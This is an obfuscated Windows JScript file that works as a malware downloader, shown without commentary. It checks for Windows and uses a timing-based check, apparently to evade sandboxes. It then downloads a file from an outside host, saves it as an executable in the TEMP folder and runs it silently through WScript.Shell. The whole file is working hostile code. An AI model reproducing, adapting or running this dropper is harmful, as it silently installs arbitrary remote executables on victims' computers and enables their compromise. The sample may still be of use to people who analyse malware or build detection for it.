var _D = false;
var _JQ = "CreateObject";
var _I = function _A() {return WScript[_JQ]("WScript"+".Shell");}(), _XS = 11;
var _K = "MSXML2.XMLHTTP";
var _B = 2123213;
var _MO = 0;
function _P(_J){_I["Run"](_J, _MO, _MO);};
function _Z0(){return _K + "";};
function _A1(_B0, _TT0){_MO = _MO * 1; return _B0 - _TT0;};
function _YQ(){return _JQ;};
/*@cc_on
  @if (@_win32 || @_win64)
    _D = true;
  @end
@*/
if (_D)
{
var _Y = "";
function _A0(){return 22;};
var _O0 = 0; var _LS = 0;
function _EB()
{
var _V0 = new this["Date"]();
var _S = _V0["getUTCMilliseconds"]();
WScript["Sleep"](_A0());
var _V0 = new this["Date"]();
var _QM = _V0["getUTCMilliseconds"]();
WScript["Sleep"](_A0());
var _V0 = new this["Date"]();
var _V = _V0["getUTCMilliseconds"]();
var _O0 = "_CW";
_O0 = _A1(_QM, _S);
var _LS = "_RL";
_LS = _A1(_V, _QM);
_Y = "open";
return _A1(_O0, _LS);
}
var _F = false;
var _XE = false;
for (var _VT = _MO; _VT < _A0() * 1; _VT++){if (_EB() != _MO){
_F = true; 
_LS = "31" + 11 * _O0 + _LS; 
_XE = true; 
break;
}}
function _OM() {return ((_F == true) && (_F == _XE)) ? 1 : _MO;};
if (_F && _OM() && _XE){
function _Z() {return _I["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "UHCVfEA6QW.ex" + "e";};
 _CG = _Z0();
 _ME = WScript[_JQ](_CG);
 var _G = 1;
 while (_G){
try {
	if (_G == 1)
	{
		_ME[_Y]("GET", "http://ihlasauracleanmax.co/j3dlad", false);
		_ME["send"]();
		_DZ = "Sleep";
	}
	WScript[_DZ](_A0() + 120); 
	if (_ME["readystate"] < 2 * 2) continue;
	_G = _MO;
	function _TT(_R) {var _O = (1, 2, 3, 4, 5, _R); return _O;};
	_Y0 = WScript[_YQ()]("ADODB.Stream");
	_CG = _Y0;
	_CG[_Y]();
	_CG["type"] = _TT(1);
	_CG["write"](_ME["ResponseBody"]);
	_Y0["position"] = _TT(_MO);
	_CG["Save" + "ToFile"](_Z(), 2);
	_Y0["cl"+"ose"]();
	_UM = _Z();
	_P(_UM);
} catch(_T){};
}
}
}

